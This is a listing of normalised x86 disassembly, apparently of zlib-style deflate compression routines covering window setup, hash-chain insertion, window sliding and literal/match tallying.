mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406dc5
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x30 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x38 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x3c ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x10 ]
sub ecx [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
shr eax 0x1
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax * 2 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x169c ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x1694 ]
imul edx edx 0x3
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + 0x1690 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x8c
mov ecx [ ebp - 0xc ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp - 0xc ]
add edx 0x980
mov eax [ ebp - 0xc ]
mov [ eax + 0xb1c ] edx
mov ecx [ ebp - 0xc ]
add ecx 0xa74
mov edx [ ebp - 0xc ]
mov [ edx + 0xb28 ] ecx
xor eax eax
sub_407122
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov [ eax + ecx * 2 - 0x2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
lea eax [ edx + edx - 0x2 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
call memset
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x78 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x7c ]
imul eax eax 0xc
xor ecx ecx
mov cx [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x54 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] 0x0
pop ebp
retn
sub_407210
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] 0xffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
sub ecx 0x5
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x1
ja r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
sub eax 0x5
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x6c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_407450
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
cmp edx [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
cmp edx ecx
jb r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409112
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406d00
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x54 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x54 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409112
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406d00
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0xc ] 0x4
sete cl
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409112
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_406d00
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
sub_407450
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx - 0x106 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jb r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
add edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x68 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x68 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x54 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x54 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov eax [ ebp - 0x14 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x64 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + 0x6c ]
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_40768b
add esp 0xc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x3
jb r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x106
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
xor eax eax
mov al [ edx + ecx ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx 0x2
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
mov dx [ ebp - 0x18 ]
mov [ ecx ] dx
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x34 ]
sub ecx [ eax + 0x6c ]
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x64 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x2
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dx [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov ax [ ebp - 0x1c ]
mov [ edx ] ax
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub_40768b
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call sub_408700
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x30 ] eax
mov esp ebp
pop ebp
retn
sub_407723
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407450
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x3
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
cmp eax edx
ja r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov dl [ edx + ecx ]
mov [ ebp - 0x14 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x14 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x6c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x3
mov [ ebp - 0x10 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0xc ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x10 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0xc ]
sub dx 0x1
mov [ ebp - 0xc ] dx
mov eax [ ebp - 0x10 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x10 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0xc ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0xc ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_407c7a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x58 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
xor ecx ecx
mov cl [ eax + edx ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x40 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
sub eax [ edx + 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x6c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x58 ]
cmp ecx [ eax + 0x78 ]
ja r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409112
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_406d00
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409112
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_406d00
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
